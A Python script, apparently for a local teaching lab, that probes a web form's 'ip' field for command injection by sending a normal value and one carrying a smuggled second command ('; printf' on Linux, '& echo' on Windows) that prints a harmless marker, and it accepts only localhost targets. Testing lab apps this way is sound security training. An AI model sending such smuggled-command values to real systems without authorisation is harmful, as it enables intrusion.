"""Local command-injection echo draft. Select the actual server OS first."""
import argparse
import json
from pathlib import Path
from urllib.error import HTTPError
from urllib.parse import urlencode, urljoin, urlparse
from urllib.request import HTTPRedirectHandler, Request, build_opener


class NoRedirect(HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def local_url(base, path):
    url = urljoin(base.rstrip("/") + "/", path)
    original, target = urlparse(base), urlparse(url)
    if target.scheme not in ("http", "https") or target.hostname not in ("localhost", "127.0.0.1", "::1"):
        raise ValueError("Only a local teaching target is accepted")
    if target.username or target.password or (target.scheme, target.netloc) != (original.scheme, original.netloc):
        raise ValueError("Target must remain on the declared local origin")
    return url


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", required=True)
    parser.add_argument("--path", required=True)
    parser.add_argument("--cookie-file", type=Path, required=True)
    parser.add_argument("--os", choices=("linux", "windows"), required=True)
    args = parser.parse_args()
    url = local_url(args.base_url, args.path)
    cookie = args.cookie_file.read_text(encoding="utf-8").strip()
    if "\r" in cookie or "\n" in cookie:
        raise ValueError("Cookie file must contain one header value")
    injected = "127.0.0.1; printf LLM_LAB_CMD" if args.os == "linux" else "127.0.0.1 & echo LLM_LAB_CMD"
    observations = []
    opener = build_opener(NoRedirect())
    for label, value in (("normal", "127.0.0.1"), ("test", injected)):
        request = Request(url, data=urlencode({"Submit": "Submit", "ip": value}).encode(), headers={"Cookie": cookie})
        try:
            with opener.open(request, timeout=15) as response:
                status, body = response.status, response.read().decode("utf-8", errors="replace")
        except HTTPError as exc:
            status, body = exc.code, exc.read().decode("utf-8", errors="replace")
        observations.append({"case": label, "status": status, "marker_present": "LLM_LAB_CMD" in body})
    print(json.dumps({"observations": observations, "verdict": "Check the extra marker in actual command output; request reflection, authentication and execution configuration require manual review"}, indent=2))


if __name__ == "__main__":
    main()
